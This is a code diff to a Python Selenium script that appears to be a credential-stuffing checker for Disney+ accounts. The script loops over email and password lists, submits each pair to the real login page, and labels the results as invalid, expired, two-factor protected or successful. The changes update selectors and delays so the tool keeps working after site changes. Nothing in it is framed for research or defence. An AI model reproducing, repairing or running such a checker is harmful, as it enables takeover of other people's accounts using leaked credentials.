@@ -28,7 +28,7 @@ def disney():
     browser_options.add_argument(
         'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
     browser_options.add_experimental_option('excludeSwitches',['enable-logging'])
-    browser_options.add_argument("--headless=new")
+    #browser_options.add_argument("--headless=new")
     os.makedirs(plain_directory + '/accounts', exist_ok=True)
     index = 0
     while index != len(users):
@@ -39,30 +39,34 @@ def disney():
                 browser = webdriver.Chrome(options=browser_options)
                 browser.set_window_size(200,200)
                 browser.get(page)
-                time.sleep(10)
+                time.sleep(16)
                 if browser.find_elements(By.XPATH, '//*[@id="onetrust-reject-all-handler"]'):
                     gdpr_reject_all = browser.find_element(By.XPATH, '//*[@id="onetrust-reject-all-handler"]')
                     gdpr_reject_all.click()
                 email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
                 email_input_box.send_keys(users[index])
-                if browser.find_elements(By.XPATH, '//*[@id="loginEmail"]/div[2]/button'):
-                    email_submit_button = browser.find_element(By.XPATH, '//*[@id="loginEmail"]/div[2]/button')
-                    email_submit_button.click()
-                    time.sleep(2)
+                time.sleep(2)
+                email_submit_button = browser.find_element(By.XPATH, '//*[@id="content"]/div/div/div/div['
+                                                                     '2]/div/div/div/form/button')
+                email_submit_button.click()
+                time.sleep(3)
                 if browser.find_elements(By.XPATH, '//*[@id="app_index"]/div[3]/div/div'):
                     print(" | {}:{} ---> Invalid Email".format(users[index], passwords[index]))
                     iframe = True
                 if browser.find_elements(By.XPATH, '//*[@id="loginEmail"]/div[2]/button') and iframe != True:
                     continue_button = browser.find_element(By.XPATH, '//*[@id="loginEmail"]/div[2]/button')
                     continue_button.click()
-                if browser.find_elements(By.XPATH, '//*[@id="password-continue-login"]'):
+                if 'https://www.disneyplus.com/identity/login/enter-password' in browser.current_url:
                     pass_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
                     pass_input_box.send_keys(passwords[index])
                     time.sleep(2)
-                    login_button = browser.find_element(By.XPATH, '//*[@id="password-continue-login"]')
+                    login_button = browser.find_element(By.XPATH, '//*[@id="content"]/div/div/div/div['
+                                                                  '2]/div/div/div/form/button')
                     login_button.click()
                     time.sleep(7)
                     login_process_complete = True
+                if 'https://www.disneyplus.com/identity/sign-up/create-password' in browser.current_url:
+                    print(" | {}:{} ---> Invalid Email".format(users[index], passwords[index]))
                 if browser.find_elements(By.XPATH, '//*[@id="section_index"]/div/div[2]/div/button'):
                     print(" | {}:{} ---> Subscription Expired".format(users[index], passwords[index]))
                 if browser.find_elements(By.XPATH, '//*[@id="onboarding_index"]/div/div/form/h3'):
@@ -71,7 +75,7 @@ def disney():
                         print(" | {}:{} ---> Protected by Two-Factor Authentication".format(users[index],
                                                                                             passwords[index]))
                 if login_process_complete:
-                    time.sleep(5)
+                    time.sleep(10)
                     if browser.find_elements(By.XPATH, '//*[@id="password__error"]'):
                         print(" | {}:{} ---> Invalid Password".format(users[index], passwords[index]))
                     if browser.find_elements(By.XPATH, '//*[@id="remove-main-padding_index"]/div/div/section') or 'home' in browser.current_url:
